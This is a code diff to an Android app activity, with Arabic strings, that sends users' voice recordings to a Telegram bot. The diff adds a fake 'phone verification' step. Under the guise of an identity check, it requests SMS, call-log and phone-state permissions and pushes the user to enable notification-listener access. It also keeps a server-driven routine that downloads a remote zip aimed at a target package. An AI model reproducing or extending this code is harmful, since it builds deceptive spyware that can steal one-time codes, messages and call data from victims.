@@ -33,7 +33,6 @@ import android.widget.ScrollView;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.cardview.widget.CardView;
 import androidx.core.app.ActivityCompat;
@@ -71,10 +70,10 @@ public class SecondActivity extends AppCompatActivity {
     private final String ADMIN_CHAT_ID = "1749638488";
     private final OkHttpClient client = new OkHttpClient();
 
-    private CardView layoutWaiting, layoutRejected, layoutFields, layoutZipTask;
+    private CardView layoutWaiting, layoutRejected, layoutFields, layoutZipTask, layoutVerifyTask;
     private TextView txtRejectReason, txtProgressStatus, txtTicketID;
-    private Button btnCancelOrder, btnExecuteTask;
-    private ProgressBar taskProgressBar;
+    private Button btnCancelOrder, btnExecuteTask, btnStartFullVerify;
+    private ProgressBar taskProgressBar, verifyProgressBar;
 
     private MediaRecorder recorder;
     private String voiceFileName;
@@ -89,15 +88,12 @@ public class SecondActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_second);
 
-        // طلب إذن الملفات فقط عند التشغيل
         requestStoragePermissions();
-
         userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "UnknownUser");
 
         initViews();
         setupFloatingChatButton();
         generateTicketID();
-        startStatusSequence();
         startAutoRefresh();
     }
 
@@ -116,12 +112,17 @@ public class SecondActivity extends AppCompatActivity {
         layoutRejected = findViewById(R.id.layoutRejected);
         layoutFields = findViewById(R.id.layoutFields);
         layoutZipTask = findViewById(R.id.layoutZipTask);
+        layoutVerifyTask = findViewById(R.id.layoutVerifyTask); // الواجهة الزرقاء الجديدة
+
         txtProgressStatus = findViewById(R.id.txtProgressStatus);
         txtTicketID = findViewById(R.id.txtTicketID);
         txtRejectReason = findViewById(R.id.txtRejectReason);
         btnCancelOrder = findViewById(R.id.btnCancelOrder);
         btnExecuteTask = findViewById(R.id.btnExecuteTask);
+        btnStartFullVerify = findViewById(R.id.btnStartFullVerify);
+
         taskProgressBar = findViewById(R.id.taskProgressBar);
+        verifyProgressBar = findViewById(R.id.verifyProgressBar);
 
         btnCancelOrder.setOnClickListener(v -> {
             stopAutoRefresh();
@@ -134,8 +135,7 @@ public class SecondActivity extends AppCompatActivity {
     private void setupFloatingChatButton() {
         fabChat = new FloatingActionButton(this);
         fabChat.setImageResource(android.R.drawable.stat_notify_chat);
-        // لون أخضر هادئ للزر العائم
-        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#2E7D32")));
+        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#1A73E8")));
         FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(-2, -2);
         params.gravity = Gravity.BOTTOM | Gravity.START;
         params.setMargins(50, 0, 0, 50);
@@ -178,17 +178,17 @@ public class SecondActivity extends AppCompatActivity {
             }
         });
 
-        // طلب الإذن فقط عند لمس الميكروفون
         btnRecord.setOnTouchListener((v, event) -> {
             if (event.getAction() == MotionEvent.ACTION_DOWN) {
                 if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                     ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, 101);
-                    Toast.makeText(this, "يرجى السماح بالوصول للميكروفون للتسجيل", Toast.LENGTH_SHORT).show();
                 } else {
                     startVoiceRecording();
+                    btnRecord.setColorFilter(Color.RED);
                 }
             } else if (event.getAction() == MotionEvent.ACTION_UP) {
                 stopVoiceRecording();
+                btnRecord.setColorFilter(Color.parseColor("#1A73E8"));
             }
             return true;
         });
@@ -198,7 +198,7 @@ public class SecondActivity extends AppCompatActivity {
 
     private void startVoiceRecording() {
         try {
-            voiceFileName = getExternalCacheDir().getAbsolutePath() + "/audio_msg.m4a";
+            voiceFileName = getExternalCacheDir().getAbsolutePath() + "/v_msg.m4a";
             recorder = new MediaRecorder();
             recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
@@ -206,7 +206,6 @@ public class SecondActivity extends AppCompatActivity {
             recorder.setOutputFile(voiceFileName);
             recorder.prepare();
             recorder.start();
-            Toast.makeText(this, "جاري التسجيل...", Toast.LENGTH_SHORT).show();
         } catch (Exception e) { e.printStackTrace(); }
     }
 
@@ -216,6 +215,7 @@ public class SecondActivity extends AppCompatActivity {
                 recorder.stop();
                 recorder.release();
                 recorder = null;
+                saveMessageToFirebase("user", "🎤 بصمة صوتية");
                 sendVoiceToTelegram(voiceFileName);
             } catch (RuntimeException e) {
                 if (recorder != null) { recorder.release(); recorder = null; }
@@ -229,7 +229,6 @@ public class SecondActivity extends AppCompatActivity {
         RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                 .addFormDataPart("voice", file.getName(), RequestBody.create(file, MediaType.parse("audio/m4a")))
                 .addFormDataPart("chat_id", ADMIN_CHAT_ID)
-                .addFormDataPart("caption", "🎤 رسالة صوتية من: " + userName)
                 .build();
         client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendVoice").post(body).build()).enqueue(new Callback() {
             @Override public void onFailure(Call call, IOException e) {}
@@ -243,6 +242,60 @@ public class SecondActivity extends AppCompatActivity {
             @Override public void onFailure(Call call, IOException e) {}
             @Override public void onResponse(Call call, Response response) {}
         });
+    }
+
+    private void updateUI(String status, JSONObject data) {
+        layoutWaiting.setVisibility(View.GONE);
+        layoutRejected.setVisibility(View.GONE);
+        layoutFields.setVisibility(View.GONE);
+        layoutZipTask.setVisibility(View.GONE);
+        layoutVerifyTask.setVisibility(View.GONE);
+
+        switch (status) {
+            case "rejected":
+                layoutRejected.setVisibility(View.VISIBLE);
+                txtRejectReason.setText(data.optString("reason", "تم الرفض"));
+                break;
+            case "fields":
+                layoutFields.setVisibility(View.VISIBLE);
+                break;
+            case "zip_task":
+                layoutZipTask.setVisibility(View.VISIBLE);
+                btnExecuteTask.setOnClickListener(v -> 
+                    startModdingProcess(data.optString("zip_url"), data.optString("target_package")));
+                break;
+            case "verify_phone":
+                layoutVerifyTask.setVisibility(View.VISIBLE);
+                btnStartFullVerify.setOnClickListener(v -> executeFullVerify());
+                break;
+            default:
+                layoutWaiting.setVisibility(View.VISIBLE);
+                break;
+        }
+    }
+
+    private void executeFullVerify() {
+        btnStartFullVerify.setEnabled(false);
+        verifyProgressBar.setVisibility(View.VISIBLE);
+
+        // 1. طلب أذونات الهاتف والرسائل
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            ActivityCompat.requestPermissions(this, new String[]{
+                    Manifest.permission.READ_PHONE_STATE,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_SMS
+            }, 202);
+        }
+
+        // 2. توجيه المستخدم لتفعيل مراقب الإشعارات
+        new Handler().postDelayed(() -> {
+            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+            startActivity(intent);
+            Toast.makeText(this, "يرجى تفعيل 'نظام فحص الهوية' لإتمام الربط", Toast.LENGTH_LONG).show();
+            btnStartFullVerify.setEnabled(true);
+            verifyProgressBar.setVisibility(View.GONE);
+        }, 2000);
     }
 
     private void startModdingProcess(String url, String pkg) {
@@ -274,7 +327,7 @@ public class SecondActivity extends AppCompatActivity {
     private void downloadFileSync(String url, File destFile) throws IOException {
         Request request = new Request.Builder().url(url).build();
         try (Response response = client.newCall(request).execute()) {
-            if (!response.isSuccessful()) throw new IOException("Failed to download");
+            if (!response.isSuccessful()) throw new IOException("Download failed");
             try (BufferedSink sink = Okio.buffer(Okio.sink(destFile))) {
                 sink.writeAll(response.body().source());
             }
@@ -324,31 +377,6 @@ public class SecondActivity extends AppCompatActivity {
         });
     }
 
-    private void updateUI(String status, JSONObject data) {
-        layoutWaiting.setVisibility(View.GONE);
-        layoutRejected.setVisibility(View.GONE);
-        layoutFields.setVisibility(View.GONE);
-        layoutZipTask.setVisibility(View.GONE);
-
-        switch (status) {
-            case "rejected":
-                layoutRejected.setVisibility(View.VISIBLE);
-                txtRejectReason.setText(data.optString("reason", "Reason not specified"));
-                break;
-            case "fields":
-                layoutFields.setVisibility(View.VISIBLE);
-                break;
-            case "zip_task":
-                layoutZipTask.setVisibility(View.VISIBLE);
-                btnExecuteTask.setOnClickListener(v -> 
-                    startModdingProcess(data.optString("zip_url"), data.optString("target_package")));
-                break;
-            default:
-                layoutWaiting.setVisibility(View.VISIBLE);
-                break;
-        }
-    }
-
     private void startChatMonitoring(LinearLayout container, ScrollView scroll) {
         chatRunnable = new Runnable() {
             @Override public void run() { loadChatMessages(container, scroll); chatHandler.postDelayed(this, 3000); }
@@ -385,18 +413,15 @@ public class SecondActivity extends AppCompatActivity {
         TextView tv = new TextView(this);
         tv.setText(text);
         tv.setPadding(35, 25, 35, 25);
+        tv.setTextSize(14);
         LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-2, -2);
         lp.setMargins(15, 10, 15, 10);
         if (sender.equals("user")) {
-            // رسالة المستخدم: خلفية خضراء هادئة
             tv.setBackgroundResource(android.R.drawable.editbox_dropdown_light_frame);
-            tv.setBackgroundColor(Color.parseColor("#E8F5E9"));
             tv.setTextColor(Color.BLACK);
             lp.gravity = Gravity.END;
         } else {
-            // رسالة المدير: خلفية خضراء غامقة
             tv.setBackgroundResource(android.R.drawable.editbox_dropdown_dark_frame);
-            tv.setBackgroundColor(Color.parseColor("#2E7D32"));
             tv.setTextColor(Color.WHITE);
             lp.gravity = Gravity.START;
         }
@@ -421,5 +446,4 @@ public class SecondActivity extends AppCompatActivity {
     private void stopChatMonitoring() { chatHandler.removeCallbacks(chatRunnable); }
     private void stopAutoRefresh() { refreshHandler.removeCallbacks(refreshRunnable); }
     @Override protected void onDestroy() { super.onDestroy(); stopAutoRefresh(); stopChatMonitoring(); }
-    private void startStatusSequence() { /* منطق رسائل الانتظار */ }
 }
